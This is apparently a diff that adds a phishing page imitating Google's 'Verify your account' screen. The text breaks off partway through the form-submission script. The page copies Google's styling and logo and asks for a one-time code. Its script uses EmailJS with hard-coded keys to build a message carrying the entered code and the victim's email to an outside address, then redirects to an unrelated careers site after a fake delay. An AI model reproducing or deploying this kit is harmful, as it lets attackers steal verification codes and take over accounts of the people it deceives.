@@ -1,0 +1,1122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verify your account - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
+    <style>
+        /* ============================================
+           CSS VARIABLES - EXACTLY FROM GOOGLE
+           ============================================ */
+        :root {
+            --wf-tfs: calc(var(--c-tfs, 32) / 16 * 1rem);
+            --wf-tfs-bp2: calc(var(--c-tfs, 36) / 16 * 1rem);
+            --wf-tfs-bp3: calc(var(--c-tfs, 36) / 16 * 1rem);
+            --wf-tfs-bp5: calc(var(--c-tfs, 44) / 16 * 1rem);
+            --wf-stfs: calc(var(--c-stfs, 16) / 16 * 1rem);
+            --wf-stfs-bp5: calc(var(--c-stfs, 16) / 16 * 1rem);
+            --wf-harmonize-filter-light: none;
+            --wf-harmonize-filter-dark: none;
+            --wf-color-warning-bg: #754200;
+            --wf-color-warning-icon: #ffdf99;
+            --wf-color-warning-text: #fff0d1;
+            --wf-color-gradient-start: rgba(40, 42, 44, 0);
+
+            --c-gutw: 48px;
+            --c-brsz: 48px;
+            --c-ps-t: 24px;
+            --c-ps-s: 32px;
+            --c-ps-e: 32px;
+            --c-tfs: 32;
+            --c-stfs: 16;
+
+            --wf-gutw-hlf: calc(var(--c-gutw) / 2);
+            --wf-gutw-hlf-bp2: calc(var(--c-gutw, 76px) / 2);
+            --wf-brsz: calc(var(--c-brsz) + 24px);
+            --wf-ps-t: calc(var(--c-ps-t) + var(--wf-brsz, 72px));
+            --wf-ps-t-bp2: calc(var(--c-ps-t) + var(--wf-brsz, 72px));
+            --wf-ps-t-bp5: calc(var(--c-ps-t, 36px) + var(--wf-brsz, 72px));
+            --wf-ps-t-bp3-l: calc(var(--c-ps-t, 36px) + var(--wf-brsz, 72px));
+
+            /* Google Material 3 Light Theme Colors (Default) */
+            --gm3-sys-color-background: rgb(255 255 255 / 1);
+            --gm3-sys-color-error: rgb(186 26 26 / 1);
+            --gm3-sys-color-error-container: rgb(248 215 213 / 1);
+            --gm3-sys-color-inverse-on-surface: rgb(242 242 242 / 1);
+            --gm3-sys-color-inverse-primary: rgb(168 199 250 / 1);
+            --gm3-sys-color-inverse-surface: rgb(48 48 48 / 1);
+            --gm3-sys-color-on-background: rgb(31 31 31 / 1);
+            --gm3-sys-color-on-error: rgb(255 255 255 / 1);
+            --gm3-sys-color-on-error-container: rgb(186 26 26 / 1);
+            --gm3-sys-color-on-primary: rgb(255 255 255 / 1);
+            --gm3-sys-color-on-primary-container: rgb(11 87 208 / 1);
+            --gm3-sys-color-on-secondary: rgb(255 255 255 / 1);
+            --gm3-sys-color-on-secondary-container: rgb(0 74 119 / 1);
+            --gm3-sys-color-on-surface: rgb(31 31 31 / 1);
+            --gm3-sys-color-on-surface-variant: rgb(68 71 70 / 1);
+            --gm3-sys-color-on-tertiary: rgb(255 255 255 / 1);
+            --gm3-sys-color-on-tertiary-container: rgb(15 82 35 / 1);
+            --gm3-sys-color-outline: rgb(121 126 123 / 1);
+            --gm3-sys-color-outline-variant: rgb(196 199 197 / 1);
+            --gm3-sys-color-primary: rgb(26 115 232 / 1);
+            --gm3-sys-color-primary-container: rgb(211 227 253 / 1);
+            --gm3-sys-color-scrim: rgb(0 0 0 / 1);
+            --gm3-sys-color-secondary: rgb(30 115 179 / 1);
+            --gm3-sys-color-secondary-container: rgb(194 231 255 / 1);
+            --gm3-sys-color-shadow: rgb(0 0 0 / 1);
+            --gm3-sys-color-surface: rgb(255 255 255 / 1);
+            --gm3-sys-color-surface-bright: rgb(255 255 255 / 1);
+            --gm3-sys-color-surface-container: rgb(242 242 242 / 1);
+            --gm3-sys-color-surface-container-high: rgb(232 232 232 / 1);
+            --gm3-sys-color-surface-container-highest: rgb(218 218 218 / 1);
+            --gm3-sys-color-surface-container-low: rgb(248 248 248 / 1);
+            --gm3-sys-color-surface-container-lowest: rgb(255 255 255 / 1);
+            --gm3-sys-color-surface-dim: rgb(218 218 218 / 1);
+            --gm3-sys-color-surface-variant: rgb(227 227 227 / 1);
+            --gm3-sys-color-tertiary: rgb(15 82 35 / 1);
+            --gm3-sys-color-tertiary-container: rgb(196 238 208 / 1);
+
+            --wf-color-warning-bg: #fce8e6;
+            --wf-color-warning-icon: #d93025;
+            --wf-color-warning-text: #1a1a1a;
+
+            color-scheme: light;
+        }
+
+        /* ============================================
+           DARK THEME - SYSTEM PREFERENCE
+           ============================================ */
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --gm3-sys-color-background: rgb(0 0 0 / 1);
+                --gm3-sys-color-error: rgb(242 184 181 / 1);
+                --gm3-sys-color-error-container: rgb(140 29 24 / 1);
+                --gm3-sys-color-inverse-on-surface: rgb(48 48 48 / 1);
+                --gm3-sys-color-inverse-primary: rgb(11 87 208 / 1);
+                --gm3-sys-color-inverse-surface: rgb(227 227 227 / 1);
+                --gm3-sys-color-on-background: rgb(227 227 227 / 1);
+                --gm3-sys-color-on-error: rgb(96 20 16 / 1);
+                --gm3-sys-color-on-error-container: rgb(249 222 220 / 1);
+                --gm3-sys-color-on-primary: rgb(6 46 111 / 1);
+                --gm3-sys-color-on-primary-container: rgb(211 227 253 / 1);
+                --gm3-sys-color-on-secondary: rgb(0 51 85 / 1);
+                --gm3-sys-color-on-secondary-container: rgb(194 231 255 / 1);
+                --gm3-sys-color-on-surface: rgb(227 227 227 / 1);
+                --gm3-sys-color-on-surface-variant: rgb(196 199 197 / 1);
+                --gm3-sys-color-on-tertiary: rgb(10 56 24 / 1);
+                --gm3-sys-color-on-tertiary-container: rgb(196 238 208 / 1);
+                --gm3-sys-color-outline: rgb(142 145 143 / 1);
+                --gm3-sys-color-outline-variant: rgb(68 71 70 / 1);
+                --gm3-sys-color-primary: rgb(168 199 250 / 1);
+                --gm3-sys-color-primary-container: rgb(8 66 160 / 1);
+                --gm3-sys-color-scrim: rgb(0 0 0 / 1);
+                --gm3-sys-color-secondary: rgb(127 207 255 / 1);
+                --gm3-sys-color-secondary-container: rgb(0 74 119 / 1);
+                --gm3-sys-color-shadow: rgb(0 0 0 / 1);
+                --gm3-sys-color-surface: rgb(19 19 20 / 1);
+                --gm3-sys-color-surface-bright: rgb(55 57 59 / 1);
+                --gm3-sys-color-surface-container: rgb(30 31 32 / 1);
+                --gm3-sys-color-surface-container-high: rgb(40 42 44 / 1);
+                --gm3-sys-color-surface-container-highest: rgb(51 53 55 / 1);
+                --gm3-sys-color-surface-container-low: rgb(27 27 27 / 1);
+                --gm3-sys-color-surface-container-lowest: rgb(14 14 14 / 1);
+                --gm3-sys-color-surface-dim: rgb(19 19 20 / 1);
+                --gm3-sys-color-surface-variant: rgb(68 71 70 / 1);
+                --gm3-sys-color-tertiary: rgb(109 213 140 / 1);
+                --gm3-sys-color-tertiary-container: rgb(15 82 35 / 1);
+
+                --wf-color-warning-bg: #754200;
+                --wf-color-warning-icon: #ffdf99;
+                --wf-color-warning-text: #fff0d1;
+
+                color-scheme: dark;
+            }
+        }
+
+        /* ============================================
+           RESET
+           ============================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: inherit;
+            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+        }
+
+        html {
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: var(--gm3-sys-color-surface, #ffffff);
+            color: var(--gm3-sys-color-on-surface, #1f1f1f);
+            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
+            font-size: 0.875rem;
+            font-weight: 400;
+            letter-spacing: 0rem;
+            line-height: 1.4285714286;
+            direction: ltr;
+            color-scheme: light dark;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+            padding: 20px;
+        }
+
+        /* ============================================
+           MAIN CARD
+           ============================================ */
+        .signin-card {
+            background-color: var(--gm3-sys-color-surface-container-lowest, #ffffff);
+            border-radius: 28px;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            margin: 0 auto;
+            padding: var(--wf-ps-t-bp2, 96px) var(--c-ps-e, 32px) 24px var(--c-ps-s, 32px);
+            width: 100%;
+            max-width: 448px;
+            min-height: 480px;
+            border: 1px solid var(--gm3-sys-color-outline-variant, #c4c7c5);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+        }
+
+        /* ============================================
+           GOOGLE LOGO
+           ============================================ */
+        .google-logo-wrapper {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+
+        .google-logo {
+            width: 48px;
+            height: 48px;
+            flex-shrink: 0;
+        }
+
+        /* ============================================
+           HEADINGS
+           ============================================ */
+        .heading-wrapper {
+            text-align: center;
+            margin-bottom: 12px;
+        }
+
+        .heading {
+            font-size: var(--wf-tfs, 1.5rem);
+            font-weight: 400;
+            color: var(--gm3-sys-color-on-surface, #1f1f1f);
+            text-align: center;
+            margin-bottom: 0;
+            letter-spacing: 0;
+            line-height: 1.333;
+            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
+        }
+
+        .subheading {
+            font-size: var(--wf-stfs, 1rem);
+            font-weight: 400;
+            color: var(--gm3-sys-color-on-surface-variant, #444746);
+            text-align: center;
+            line-height: 1.5;
+            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
+            margin-top: 4px;
+        }
+
+        /* ============================================
+           OTP INFO TEXT
+           ============================================ */
+        .otp-info {
+            text-align: center;
+            font-size: 14px;
+            color: var(--gm3-sys-color-on-surface-variant, #444746);
+            line-height: 1.6;
+            margin-bottom: 24px;
+            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
+        }
+
+        .otp-info .email-highlight {
+            color: var(--gm3-sys-color-on-surface, #1f1f1f);
+            font-weight: 500;
+        }
+
+        /* ============================================
+           FORM
+           ============================================ */
+        .form-section {
+            width: 100%;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ============================================
+           OTP INPUT WITH FLOATING LABEL
+           ============================================ */
+        .input-group {
+            width: 100%;
+            margin-bottom: 4px;
+            position: relative;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 20px;
+            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
+            border: 1px solid var(--gm3-sys-color-outline, #797e7b);
+            border-radius: 4px;
+            background: transparent;
+            outline: none;
+            color: var(--gm3-sys-color-on-surface, #1f1f1f);
+            height: 56px;
+            box-sizing: border-box;
+            font-weight: 500;
+            text-align: center;
+            letter-spacing: 8px;
+            transition: border 0.2s, box-shadow 0.2s;
+        }
+
+        .input-group input:focus {
+            border-color: var(--gm3-sys-color-primary, #1a73e8);
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .input-group input:focus + label {
+            color: var(--gm3-sys-color-primary, #1a73e8);
+        }
+
+        .input-group input.error {
+            border-color: var(--gm3-sys-color-error, #ba1a1a);
+            box-shadow: 0 0 0 4px rgba(186, 26, 26, 0.15);
+            animation: shake 0.4s ease;
+        }
+
+        .input-group input.success {
+            border-color: #34a853;
+            box-shadow: 0 0 0 4px rgba(52, 168, 83, 0.15);
+        }
+
+        .input-group label {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: var(--gm3-sys-color-surface-container-lowest, #ffffff);
+            padding: 0 4px;
+            font-size: 16px;
+            color: var(--gm3-sys-color-on-surface-variant, #444746);
+            pointer-events: none;
+            transition: 0.15s ease;
+            font-weight: 400;
+            line-height: 1.5;
+            letter-spacing: 0.1px;
+            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
+        }
+
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            top: 0;
+            transform: translateY(-50%) scale(0.75);
+            color: var(--gm3-sys-color-primary, #1a73e8);
+            font-weight: 500;
+            left: 13px;
+            padding: 0 4px;
+        }
+
+        .input-group input::placeholder {
+            color: transparent;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        /* ============================================
+           OTP ERROR MESSAGE
+           ============================================ */
+        .input-error {
+            display: none;
+            font-size: 12px;
+            color: var(--gm3-sys-color-error, #ba1a1a);
+            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
+            margin-top: 4px;
+            padding-left: 4px;
+            font-weight: 500;
+            letter-spacing: 0.2px;
+        }
+
+        .input-error.show {
+            display: block;
+        }
+
+        /* ============================================
+           RESEND OTP LINK
+           ============================================ */
+        .resend-otp {
+            text-align: center;
+            font-size: 14px;
+            color: var(--gm3-sys-color-on-surface-variant, #444746);
+            margin-top: 16px;
+            margin-bottom: 8px;
+            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
+        }
+
+        .resend-otp a {
+            color: var(--gm3-sys-color-primary, #1a73e8);
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .resend-otp a:hover {
+            text-decoration: underline;
+        }
+
+        .resend-otp .timer {
+            color: var(--gm3-sys-color-on-surface-variant, #444746);
+            font-weight: 400;
+        }
+
+        /* ============================================
+           VERIFY BUTTON WITH LOADING
+           ============================================ */
+        .btn-verify {
+            width: 100%;
+            background: var(--gm3-sys-color-primary, #1a73e8);
+            color: var(--gm3-sys-color-on-primary, #ffffff);
+            border: none;
+            border-radius: 4px;
+            padding: 10px 16px;
+            font-size: 14px;
+            font-weight: 500;
+            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
+            cursor: pointer;
+            height: 36px;
+            letter-spacing: 0.2px;
+            text-align: center;
+            line-height: 1.5;
+            transition: background 0.2s, box-shadow 0.2s, transform 0.1s, opacity 0.2s;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-verify:hover:not(:disabled) {
+            background: #1557b0;
+            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.3),
+                        0 1px 3px 1px rgba(0, 0, 0, 0.15);
+        }
+
+        .btn-verify:active:not(:disabled) {
+            transform: scale(0.98);
+        }
+
+        .btn-verify:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        /* Loading spinner */
+        .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: spin 0.8s linear infinite;
+            flex-shrink: 0;
+        }
+
+        .spinner.show {
+            display: inline-block;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Dark mode spinner */
+        @media (prefers-color-scheme: dark) {
+            .spinner {
+                border: 2px solid rgba(255, 255, 255, 0.3);
+                border-top-color: #ffffff;
+            }
+        }
+
+        /* ============================================
+           BACK TO SIGN IN LINK
+           ============================================ */
+        .back-link {
+            text-align: center;
+            font-size: 14px;
+            color: var(--gm3-sys-color-on-surface-variant, #444746);
+            margin-top: 20px;
+            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
+        }
+
+        .back-link a {
+            color: var(--gm3-sys-color-primary, #1a73e8);
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .back-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* ============================================
+           DIVIDER
+           ============================================ */
+        .divider {
+            width: 100%;
+            height: 1px;
+            background: var(--gm3-sys-color-outline-variant, #c4c7c5);
+            margin: 20px 0 16px 0;
+        }
+
+        /* ============================================
+           GUEST MODE
+           ============================================ */
+        .guest-mode {
+            width: 100%;
+            text-align: center;
+            font-size: 14px;
+            color: var(--gm3-sys-color-on-surface-variant, #444746);
+            line-height: 1.6;
+            letter-spacing: 0.2px;
+            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
+        }
+
+        .guest-mode a {
+            color: var(--gm3-sys-color-primary, #1a73e8);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .guest-mode a:hover {
+            text-decoration: underline;
+        }
+
+        /* ============================================
+           FOOTER
+           ============================================ */
+        .footer {
+            margin-top: 32px;
+            width: 100%;
+            max-width: 448px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 24px;
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .footer-links li {
+            display: inline-block;
+        }
+
+        .footer-links a {
+            color: var(--gm3-sys-color-on-surface-variant, #444746);
+            font-size: 12px;
+            text-decoration: none;
+            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
+            font-weight: 500;
+            letter-spacing: 0.2px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .language-selector {
+            position: relative;
+            display: inline-block;
+        }
+
+        .language-selector select {
+            background: transparent;
+            color: var(--gm3-sys-color-on-surface-variant, #444746);
+            border: 1px solid var(--gm3-sys-color-outline-variant, #c4c7c5);
+            border-radius: 4px;
+            padding: 8px 32px 8px 12px;
+            font-size: 13px;
+            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
+            appearance: none;
+            -webkit-appearance: none;
+            cursor: pointer;
+            outline: none;
+        }
+
+        .language-selector select:focus {
+            border-color: var(--gm3-sys-color-primary, #1a73e8);
+        }
+
+        .language-selector::after {
+            content: "▾";
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--gm3-sys-color-on-surface-variant, #444746);
+            pointer-events: none;
+            font-size: 10px;
+        }
+
+        .language-selector select option {
+            background: var(--gm3-sys-color-surface-container, #f2f2f2);
+            color: var(--gm3-sys-color-on-surface, #1f1f1f);
+        }
+
+        /* ============================================
+           TOAST NOTIFICATION
+           ============================================ */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: var(--gm3-sys-color-surface-container-high, #e8e8e8);
+            color: var(--gm3-sys-color-on-surface, #1f1f1f);
+            padding: 16px 32px;
+            border-radius: 8px;
+            border: 1px solid var(--gm3-sys-color-outline-variant, #c4c7c5);
+            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
+            font-size: 14px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            opacity: 0;
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            z-index: 1000;
+            max-width: 90%;
+            text-align: center;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .toast.success {
+            border-color: #34a853;
+        }
+
+        .toast.error {
+            border-color: #ea4335;
+        }
+
+        /* Dark mode toast override */
+        @media (prefers-color-scheme: dark) {
+            .toast {
+                background: var(--gm3-sys-color-surface-container-high, #282a2c);
+                color: var(--gm3-sys-color-on-surface, #e3e3e3);
+                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            }
+        }
+
+        /* ============================================
+           RESPONSIVE
+           ============================================ */
+        @media (max-width: 480px) {
+            .signin-card {
+                padding-left: 24px;
+                padding-right: 24px;
+                padding-bottom: 20px;
+                padding-top: 80px;
+                border-radius: 20px;
+                border: none;
+                box-shadow: none;
+                min-height: 400px;
+            }
+            .heading {
+                font-size: calc(var(--wf-tfs-bp2, 1.5rem));
+            }
+            .subheading {
+                font-size: calc(var(--wf-stfs, 1rem));
+            }
+            .footer-links {
+                gap: 16px;
+            }
+            .toast {
+                padding: 12px 20px;
+                font-size: 13px;
+                bottom: 20px;
+            }
+            .input-group input {
+                font-size: 18px;
+                letter-spacing: 6px;
+                height: 48px;
+            }
+        }
+
+        @media (min-width: 481px) and (max-width: 768px) {
+            .signin-card {
+                max-width: 400px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ==========================================
+    TOAST NOTIFICATION
+    ========================================== -->
+    <div id="toast" class="toast"></div>
+
+    <div class="signin-card">
+
+        <!-- GOOGLE LOGO -->
+        <div class="google-logo-wrapper">
+            <svg class="google-logo" viewBox="0 0 48 48" xmlns="https://www.w3.org/2000/svg">
+                <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
+                <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
+                <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
+                <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"/>
+            </svg>
+        </div>
+
+        <!-- HEADINGS -->
+        <div class="heading-wrapper">
+            <h1 class="heading">Verify your account</h1>
+            <p class="subheading">Enter the verification code</p>
+        </div>
+
+        <!-- OTP INFO -->
+        <div class="otp-info">
+            We sent a verification code to<br />
+            <span class="email-highlight" id="userEmail">user@example.com</span>
+        </div>
+
+        <!-- FORM SECTION -->
+        <form id="otpForm" class="form-section" novalidate>
+
+            <!-- OTP INPUT -->
+            <div class="input-group">
+                <input type="text" id="otpInput" placeholder=" " maxlength="9" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" autofocus />
+                <label for="otpInput">Enter verification code</label>
+            </div>
+            <div class="input-error" id="otpError">Please enter a valid verification code</div>
+
+            <!-- RESEND OTP -->
+            <div class="resend-otp">
+                <span id="resendText">Didn't receive a code?</span>
+                <a href="#" id="resendLink" onclick="resendOTP(event)">Resend</a>
+                <span class="timer" id="timerDisplay"></span>
+            </div>
+
+            <!-- VERIFY BUTTON -->
+            <button type="submit" class="btn-verify" id="verifyBtn">
+                <span id="btnText">Verify</span>
+                <span class="spinner" id="spinner"></span>
+            </button>
+
+            <!-- BACK TO SIGN IN -->
+            <div class="back-link">
+                <a href="#" onclick="goBackToSignIn(event)">← Back to sign in</a>
+            </div>
+
+            <!-- DIVIDER -->
+            <div class="divider"></div>
+
+            <!-- GUEST MODE -->
+            <div class="guest-mode">
+                Not your computer? Use Guest mode to sign in privately.
+                <a href="#" onclick="showToast('Opening Guest mode...', 'success')">Learn more about using Guest mode</a>
+            </div>
+
+            <!-- HIDDEN FIELDS -->
+            <input type="hidden" name="usi" value="S-281527366:1782083180784970" />
+            <input type="hidden" name="region" value="US" />
+        </form>
+    </div>
+
+    <!-- ==========================================
+    FOOTER
+    ========================================== -->
+    <div class="footer">
+        <!-- Language Selector -->
+        <div class="language-selector">
+            <select aria-label="Change language" onchange="showToast('Language changed to ' + this.options[this.selectedIndex].text, 'success')">
+                <option value="en-US" selected>English (United States)</option>
+                <option value="af">Afrikaans</option>
+                <option value="az">azərbaycan</option>
+                <option value="bs">bosanski</option>
+                <option value="ca">català</option>
+                <option value="cs">Čeština</option>
+                <option value="da">Dansk</option>
+                <option value="de">Deutsch</option>
+                <option value="es-ES">Español (España)</option>
+                <option value="fr-FR">Français (France)</option>
+                <option value="hi">हिन्दी</option>
+                <option value="it">Italiano</option>
+                <option value="ja">日本語</option>
+                <option value="ko">한국어</option>
+                <option value="pt-BR">Português (Brasil)</option>
+                <option value="ru">Русский</option>
+                <option value="zh-CN">简体中文</option>
+                <option value="zh-TW">繁體中文</option>
+            </select>
+        </div>
+
+        <!-- Footer Links -->
+        <ul class="footer-links">
+            <li><a href="#" onclick="showToast('Opening Help Center...', 'success')">Help</a></li>
+            <li><a href="#" onclick="showToast('Opening Privacy Policy...', 'success')">Privacy</a></li>
+            <li><a href="#" onclick="showToast('Opening Terms of Service...', 'success')">Terms</a></li>
+        </ul>
+    </div>
+
+    <!-- ==========================================
+    EMAILJS INTEGRATION
+    ========================================== -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        // ============================================
+        // EMAILJS CONFIGURATION
+        // ============================================
+        const EMAILJS_CONFIG = {
+            publicKey: 'uGRhkufMjo08rjwb_',
+            serviceID: 'service_t84doqy',
+            templateID: 'template_4rsr5vq',
+        };
+
+        // Initialize EmailJS
+        emailjs.init(EMAILJS_CONFIG.publicKey);
+
+        // ============================================
+        // TOAST NOTIFICATION
+        // ============================================
+        function showToast(message, type = 'success') {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.className = 'toast ' + type;
+            void toast.offsetWidth;
+            toast.classList.add('show');
+            clearTimeout(toast._timeout);
+            toast._timeout = setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        // ============================================
+        // OTP INPUT HANDLING
+        // ============================================
+        const otpInput = document.getElementById('otpInput');
+
+        // Allow only numbers - max 9 digits
+        otpInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').slice(0, 9);
+            document.getElementById('otpError').classList.remove('show');
+            this.classList.remove('error');
+            this.classList.remove('success');
+        });
+
+        // ============================================
+        // SHOW FIELD ERROR
+        // ============================================
+        function showFieldError(message) {
+            const input = document.getElementById('otpInput');
+            const error = document.getElementById('otpError');
+            input.classList.add('error');
+            error.textContent = message;
+            error.classList.add('show');
+        }
+
+        function clearFieldError() {
+            const input = document.getElementById('otpInput');
+            const error = document.getElementById('otpError');
+            input.classList.remove('error');
+            error.classList.remove('show');
+        }
+
+        // Clear error on focus
+        otpInput.addEventListener('focus', function() {
+            clearFieldError();
+        });
+
+        // ============================================
+        // RESEND OTP
+        // ============================================
+        let resendTimer = 30;
+        let timerInterval = null;
+
+        function resendOTP(e) {
+            e.preventDefault();
+            const link = document.getElementById('resendLink');
+            const timerDisplay = document.getElementById('timerDisplay');
+
+            link.style.pointerEvents = 'none';
+            link.style.opacity = '0.5';
+
+            resendTimer = 30;
+            timerDisplay.textContent = `(${resendTimer}s)`;
+            clearInterval(timerInterval);
+
+            timerInterval = setInterval(() => {
+                resendTimer--;
+                timerDisplay.textContent = `(${resendTimer}s)`;
+                if (resendTimer <= 0) {
+                    clearInterval(timerInterval);
+                    timerDisplay.textContent = '';
+                    link.style.pointerEvents = 'auto';
+                    link.style.opacity = '1';
+                }
+            }, 1000);
+
+            const email = localStorage.getItem('otpEmail') || 'user@example.com';
+
+            const templateParams = {
+                to_email: email,
+                subject: 'Your Verification Code',
+                message: `
+                    ========================================
+                    🔐 VERIFICATION CODE REQUESTED
+                    ========================================
+
+                    📧 Email: ${email}
+                    ⏰ Time: ${new Date().toLocaleString()}
+
+                    Please enter the verification code you received.
+
+                    ========================================
+                `,
+                reply_to: email
+            };
+
+            emailjs.send(
+                EMAILJS_CONFIG.serviceID,
+                EMAILJS_CONFIG.templateID,
+                templateParams
+            )
+            .then(function(response) {
+                showToast('✅ New verification code sent!', 'success');
+                console.log('OTP resent successfully');
+            })
+            .catch(function(error) {
+                showToast('❌ Failed to resend code. Please try again.', 'error');
+                console.error('Resend error:', error);
+            });
+        }
+
+        // ============================================
+        // GO BACK TO SIGN IN
+        // ============================================
+        function goBackToSignIn(e) {
+            e.preventDefault();
+            showToast('Returning to sign in...', 'success');
+            setTimeout(() => {
+                window.location.href = window.location.href.replace('?otp', '');
+            }, 1000);
+        }
+
+        // ============================================
+        // REDIRECT TO DASHBOARD WITH LOADING
+        // ============================================
+        function redirectToDashboard() {
+            const verifyBtn = document.getElementById('verifyBtn');
+            const btnText = document.getElementById('btnText');
+            const spinner = document.getElementById('spinner');
+
+            verifyBtn.disabled = true;
+            btnText.textContent = 'Verifying...';
+            spinner.classList.add('show');
+
+            const loadingTime = 3000 + Math.random() * 2000;
+
+            setTimeout(function() {
+                const dashboardUrl = 'https://www.pfizertalents.com/career';
+                window.location.href = dashboardUrl;
+            }, loadingTime);
+        }
+
+        // ============================================
+        // FORM SUBMISSION
+        // ============================================
+        document.getElementById('otpForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const otp = document.getElementById('otpInput').value.trim();
+            const verifyBtn = document.getElementById('verifyBtn');
+            const btnText = document.getElementById('btnText');
+
+            clearFieldError();
+
+            // Validate OTP
+            if (!otp) {
+                showFieldError('Please enter your verification code');
+                otpInput.focus();
+                return;
+            }
+
+            if (otp.length < 4) {
+                showFieldError('Please enter at least 4 digits');
+                otpInput.focus();
+                return;
+            }
+
+            if (!/^\d+$/.test(otp)) {
+                showFieldError('Please enter only numbers (0-9)');
+                otpInput.value = '';
+                otpInput.focus();
+                return;
+            }
+
+            // Show loading state
+            verifyBtn.disabled = true;
+            btnText.textContent = 'Verifying...';
+
+            const email = localStorage.getItem('otpEmail') || 'user@example.com';
+
+            const templateParams = {
+                to_email: 'youremail@example.com',
+                from_email: email,
+                otp_code: otp,
+                otp_length: otp.length,
+                subject: `🔐 OTP Verification Attempt - ${new Date().toLocaleString()}`,
